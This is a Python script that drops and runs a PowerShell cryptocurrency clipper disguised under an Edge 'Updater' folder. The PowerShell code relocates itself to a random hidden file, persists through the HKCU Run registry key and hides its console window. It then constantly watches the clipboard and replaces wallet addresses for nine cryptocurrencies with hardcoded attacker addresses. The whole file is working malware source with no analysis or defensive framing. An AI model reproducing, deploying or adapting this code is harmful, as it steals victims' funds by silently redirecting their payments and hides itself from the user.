import os, subprocess

def create_and_execute_scripts():
    user_data_path = os.path.join('C:', 'ProgramData', 'edge', 'Updater')
    if not os.path.exists(user_data_path):
        os.makedirs(user_data_path, exist_ok=True)

    scripts_path = user_data_path
    powershell_script_content = '''
$sctpth = $MyInvocation.MyCommand.Path
$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
$ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP "$ran.ps1" } else { Join-Path $env:APPDATA "$ran.ps1" }
Copy-Item -Path $sctpth -Destination $ranpth -Force
Remove-Item -Path $sctpth -Force

$key = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
$valn = "Powershell"
$val = """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ranpth"""

if (!(Test-Path $key)) {
    New-Item -Path $key -Force | Out-Null
}

Set-ItemProperty -Path $key -Name $valn -Value $val

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public static void Hide()
{
    IntPtr hWnd = GetConsoleWindow();
    if(hWnd != IntPtr.Zero)
    {
        ShowWindow(hWnd, 0);
    }
}
'
[Console.Window]::Hide()

$attr = [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr

$addy = @{
    "btc" = "bc1qh66rn66mdculzpktkvm09m7lh8rq0z3gkkdqdk"
    "eth" = "0xdF0f41d46Dd8Be583F9a69b4a85A600C8Af7f4Ad"
    "ltc" = "Lhrx96uiXy1coXwn26qkzZikHwi5DzrfJr"
    "trx" = "TXRkNprULsAjyNqT9AbZ95vuQ1daMbFzTe"
    "bch" = "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4"
    "xmr" = "44X9i4c6YhQcfLiSCrbNH25yrRfkrhrzQSeZT1meFsqtSq1K48XHXosdG4Bj9sLE7ceTbsCnL6k8LaiheZGFyfS6Nn2Hcer"
    "xrp" = "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV"
    "zcash" = "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf"
    "doge" = "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
}

while ($true) {
    $clipper = Get-Clipboard
    if ($clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$") {
        $clipper = $addy["btc"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
        $clipper = $addy["eth"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,42}$") {
        $clipper = $addy["ltc"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^T[a-zA-Z0-9]{28,33}$") {
        $clipper = $addy["trx"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^((bitcoincash:)?(q|p)[a-z0-9]{41})$") {
        $clipper = $addy["bch"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$") {
        $clipper = $addy["xmr"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^(?:^r[0-9a-zA-Z]{24,34}$)") {
        $clipper = $addy["xrp"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^t1[0-9A-z]{32,39}$") {
        $clipper = $addy["zcash"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$") {
        $clipper = $addy["doge"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    Start-Sleep -Milliseconds 200
}
'''

    ps1_path = os.path.join(scripts_path, 'Get-Clipboard.ps1')

    try:
        with open(ps1_path, 'w', encoding='utf-8') as file:
            file.write(powershell_script_content)
        print(f'Script PowerShell saved successfully at: {ps1_path}')

        subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", ps1_path], check=True)
        print('PowerShell script executed successfully')
    except Exception as error:
        print(f'Error saving or executing PowerShell script: {error}')
create_and_execute_scripts()